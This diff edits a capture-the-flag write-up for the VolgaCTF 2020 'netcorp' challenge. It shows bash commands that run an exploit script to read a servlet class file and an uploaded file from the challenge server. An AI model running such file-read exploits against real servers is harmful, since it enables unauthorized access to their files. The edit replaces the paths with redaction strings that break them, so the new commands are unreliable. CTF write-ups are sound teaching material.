@@ -88,7 +88,7 @@ And now we can retrive code of the servlets cause we have known names of package
 
 Exploit:
 ```bash
-python 48143.py -f "WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class" netcorp.q.2020.volgactf.ru
+python 48143.py -f "WEB-SECRET_REDACTED_BY_ANTIGRAVITYeenshotServlet.class" netcorp.q.2020.volgactf.ru
 ```
 
 But there is no `*.java` file for that servlet, and we can modify the exploit to save `*.class` file to local file and decompile it after download.
@@ -297,7 +297,7 @@ New route: `/asdf.jsp`
 
 Execute exploit:
 ```
-python 48143.py -f "/uploads/797cc99954a3c1a3dddeed68bb4377af" netcorp.q.2020.volgactf.ru
+python 48143.py -f "SECRET_REDACTED_BY_ANTIGRAVITYf" netcorp.q.2020.volgactf.ru
 ```
 
 Result:
